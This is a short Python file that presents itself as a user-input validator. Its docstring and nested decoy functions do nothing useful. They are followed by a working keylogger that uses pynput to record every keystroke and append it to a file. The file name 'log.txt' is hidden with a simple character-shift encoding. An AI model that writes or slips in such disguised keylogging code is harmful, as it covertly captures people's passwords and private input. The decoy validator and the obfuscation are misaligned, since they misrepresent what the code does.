def decode(s):
    return ''.join((chr(ord(c) - 1) for c in s))

def _8_entered_value(input_value):
    """
    This function validates the user input value.
    """

    def _9_user_entry():
        return True

    def _10_input_value():
        return False
    (lambda x, y: x() if type(input_value) == int else y())(_9_user_entry, _10_input_value)
import pynput

def on_press(key):
    with open(decode('mph/uyu'), decode('b')) as f:
        f.write(str(key))
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()